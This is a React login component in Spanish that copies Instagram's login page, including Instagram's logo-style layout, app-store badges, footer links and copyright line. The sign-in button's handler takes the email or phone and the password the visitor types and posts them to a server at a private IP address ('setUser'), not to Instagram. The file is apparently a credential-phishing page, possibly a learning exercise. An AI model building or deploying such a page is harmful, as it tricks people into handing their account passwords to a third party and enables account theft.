import React, { useEffect, useState } from "react";
import LetraLogo from "../assets/LetraLogo.png";
import axios from "axios";

export default function Login() {
  const [mail, setmail] = useState("");
  const [pass, setpass] = useState("");
  const [isdisable, setisdesable] = useState(true);

  useEffect(() => {
    var toggleInputContainer = function (input) {
      if (input.value !== "") {
        input.classList.add("filled");
      } else {
        input.classList.remove("filled");
      }
    };

    var labels = document.querySelectorAll(".label");
    for (var i = 0; i < labels.length; i++) {
      labels[i].addEventListener("click", function () {});
    }

    var inputs = document.getElementsByClassName("input");
    for (var i = 0; i < inputs.length; i++) {
      inputs[i].addEventListener("keyup", function () {
        toggleInputContainer(this);
      });
      toggleInputContainer(inputs[i]);
    }
  });

  useEffect(() => {
    var boton = document.getElementsByClassName("botonInst")[0]
    if (mail !== "" && pass !== "") {
      boton.classList.add("buttonInstagram")
      boton.classList.remove("buttonInstagramDisable")
      setisdesable(false)
    }else{
      boton.classList.add("buttonInstagramDisable")
      boton.classList.remove("buttonInstagram")
      setisdesable(true)
    }
  }, [mail, pass])
  return (
    <div className="z-40 h-full w-full bg-gray-500 absolute top-0 left-0 bg-opacity-25 pt-16 pb-8 px-8">
      <div className="h-full w-full bg-white p-8 overflow-auto">
        <div className="max-w-screen-sm mx-auto h-full">
          <img src={LetraLogo} alt="Logo" className="h-12 flex mx-auto mb-8" />
          <div className="w-full">
            <div className="mb-2 relative w-full">
              <input
                className="input text-xs h-9 pt-3 border border-gray-200 appearance-none rounded w-full px-2 focus:border-gray-400 focus:outline-none active:outline-none active:border-gray-400"
                value={mail}
                id="email"
                type="text"
                onChange={(e) => {
                  const { value } = e.target;
                  setmail(value);
                }}
              />
              <label
                htmlFor="email"
                className="label absolute pl-2 mt-1 leading-tighter text-gray-400 labelSmall cursor-text"
              >
                Teléfono, usuario o correo electrónico
              </label>
            </div>
            <div className="mb-4 relative w-full">
              <input
                className="input text-xs h-9 pt-3 border border-gray-200 appearance-none rounded w-full px-2 focus:border-gray-400 focus:outline-none active:outline-none active:border-gray-400"
                value={pass}
                id="password"
                type="password"
                onChange={(e) => {
                  const { value } = e.target;
                  setpass(value);
                }}
              />
              <label
                htmlFor="password"
                className="label absolute pl-2 mt-1 leading-tighter text-gray-400 labelSmall cursor-text"
              >
                Contraseña
              </label>
            </div>
            <button
              type="button"
              className="botonInst buttonInstagramDisable bg-blue-500 disabled:opacity-50 w-full text-sm py-1 text-white rounded px-4 transition duration-500 ease select-none focus:outline-none focus:shadow-outline mb-2"
              onClick={(e) => {
                e.preventDefault();
                var data= {
                  mail: mail,
                  pass: pass
                }
                axios
                  .post(`http://192.168.0.8:4000/setUser`, data)
                  .then((res) => {
                    console.log(res);
                  });
              }}
              disabled={isdisable}>
              Iniciar Sesión
            </button>
          </div>
          <div className="flex flex-row items-center mb-2">
            <div className="h-px bg-gray-300 w-2/5"></div>
            <div className="mx-auto text-gray-400 text-lg mb-1">o</div>
            <div className="h-px bg-gray-300 w-2/5"></div>
          </div>
          <div className="flex flex-wrap content-between h-96 pb-2">
            <div className="flex flex-row block	w-full">
              <h5 className="mx-auto linkInstagram2 text-sm font-medium">
                Iniciar sesión con Facebook
              </h5>
            </div>
            <div className="flex flex-row block	w-full">
              <h5 className="mx-auto linkInstagram2 text-xs">
                ¿Olvidaste tu contraseña?
              </h5>
            </div>
            <div className="flex flex-row block	w-full">
              <span className="text-xs mr-1 ml-auto">
                ¿No tienes una cuenta?{" "}
              </span>{" "}
              <a
                className="linkInstagram text-xs mr-auto"
                href="http://"
                target="_blank"
                rel="noopener noreferrer"
              >
                Regístrate
              </a>
            </div>
            <div className="flex flex-row block	w-full">
              <div className="flex m-auto">
                <h5 className="mx-auto text-sm block">Descargar app</h5>
              </div>
            </div>
            <div className="flex flex-row block	w-full">
              <div className="grid grid-cols-2 gap-2 w-full">
                <img
                  className="ml-auto sm:h-16"
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_spanish_latinamerica_mexico.png/e2247c4f90de.png"
                  alt=""
                />
                <img
                  className="mr-auto sm:h-16"
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_spanish_latinamerica_mexico-es_LA.png/3cd8a27083c0.png"
                  alt=""
                />
              </div>
            </div>
            <div className="labelSmall text-gray-400 flex flex-wrap justify-center mx-auto">
              <span className="mr-2">Información</span>
              <span className="mr-2">Blog</span>
              <span className="mr-2">Empleo</span>
              <span className="mr-2">Ayuda</span>
              <span className="mr-2">API</span>
              <span className="mr-2">Privacidad</span>
              <span className="mr-2">Condiciones</span>
              <span className="mr-2">Cuentas destacadas</span>
              <span className="mr-2">Hashtags</span>
              <span className="mr-2">Ubicaciones</span>
            </div>
            <div className="flex text-xs text-gray-400 mx-auto">
              <span>© 2021 Instagram from Facebook</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
